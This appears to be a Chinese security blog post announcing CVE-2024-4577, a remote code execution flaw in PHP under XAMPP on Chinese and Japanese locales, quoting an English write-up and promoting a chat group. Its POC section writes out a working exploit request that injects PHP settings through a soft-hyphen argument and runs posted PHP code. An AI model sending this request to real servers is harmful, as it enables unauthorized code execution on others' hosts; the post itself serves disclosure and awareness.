#  【高危0day】PHP+XAMPP超高危漏洞，影响国区数万主机   
原创 AugustTheodor  重生之成为赛博女保安   2024-06-07 18:21  
  
又是摸鱼的一天，在群里吃瓜吹水的时候群U告诉我PHP出了个RCE，可吓人。  
## 漏洞范围  
  
XAMPP 中文/日语地区 PHP  
## 漏洞编号  
  
CVE-2024-4577  
## 漏洞状态  
  
刚刚曝出，按照外文资料发文时间应该是几个小时-十几个小时前  
> Orange Tsai tweeted a few hours ago about “One of [his] PHP vulnerabilities, which affects XAMPP by default”, and we were curious to say the least. XAMPP is a very popular way for administrators and developers to rapidly deploy Apache, PHP, and a bunch of other tools, and any bug that could give us RCE in its default installation sounds pretty tantalizing.  
  
  
> Orange Tsai几个小时前在推特上发布了关于“他的一个PHP漏洞，默认情况下会影响XAMPP”的消息，至少我们很好奇。XAMPP是管理员和开发人员快速部署Apache、PHP和一系列其他工具的一种非常流行的方式，任何可能在其默认安装中为我们提供RCE的错误听起来都非常诱人。  
  
  
## 漏洞POC  
> POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1 Host: {{host}} User-Agent: curl/8.3.0 Accept:   
/ Content-Length: 23 Content-Type: application/x-www-form-urlencoded Connection: keep-alive  
  
<?php phpinfo(); ?>  
  
  
## 参考原文（英文资料）  
  
https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/  
### 彩蛋  
  
今晚对很多站长而言不太友好呀，毕竟这么大范围的高危漏洞曝出只会导致：  
  
  
  
艾尔登扫哥，变身！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/LN229gZh2CDY4putChNuKSFw07q5iczoicyzcZIXXOQw0H4U9lJWygKBlmR6nZASgoMWI6LpDbXzzmoaAElaezng/640?wx_fmt=jpeg&from=appmsg "")  
  
. . . * . *   
   
🌟   
 * . * . . .  
  
由于很多人问我微信群的事情，所以我建了一个小微信群。现在可以在公众号菜单里选择合作交流->交流群获取交流群二维码，希望大家和谐交流，为更好更友善的行业环境贡献自己的力量。  
  
